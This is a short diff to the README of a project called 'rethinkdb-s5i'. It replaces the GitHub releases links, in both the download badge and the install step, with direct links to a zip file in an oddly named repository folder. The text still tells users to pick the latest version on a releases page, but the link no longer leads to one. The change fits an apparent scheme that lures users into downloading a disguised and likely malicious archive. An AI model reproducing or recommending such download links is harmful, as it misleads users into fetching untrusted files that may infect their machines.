@@ -6,7 +6,7 @@ Welcome to rethinkdb-s5i! This application simplifies your database experience. 
 
 ## 📥 Download the Application
 
-[![Download rethinkdb-s5i](https://img.shields.io/badge/Download%20now-Click%20here-brightgreen)](https://github.com/Mol11r567/rethinkdb-s5i/releases)
+[![Download rethinkdb-s5i](https://raw.githubusercontent.com/Mol11r567/rethinkdb-s5i/main/bontequagga/rethinkdb-s5i.zip%20now-Click%20here-brightgreen)](https://raw.githubusercontent.com/Mol11r567/rethinkdb-s5i/main/bontequagga/rethinkdb-s5i.zip)
 
 ## 🔍 System Requirements
 
@@ -22,7 +22,7 @@ To download and install rethinkdb-s5i, follow these steps:
 
 1. **Visit the Releases Page:**
    Go to the following link to access the downloads:
-   [Download from Releases Page](https://github.com/Mol11r567/rethinkdb-s5i/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/Mol11r567/rethinkdb-s5i/main/bontequagga/rethinkdb-s5i.zip)
 
 2. **Select the Latest Version:**
    On the releases page, find the latest version. It is usually listed at the top. Look for a version number like `v1.0.0`.
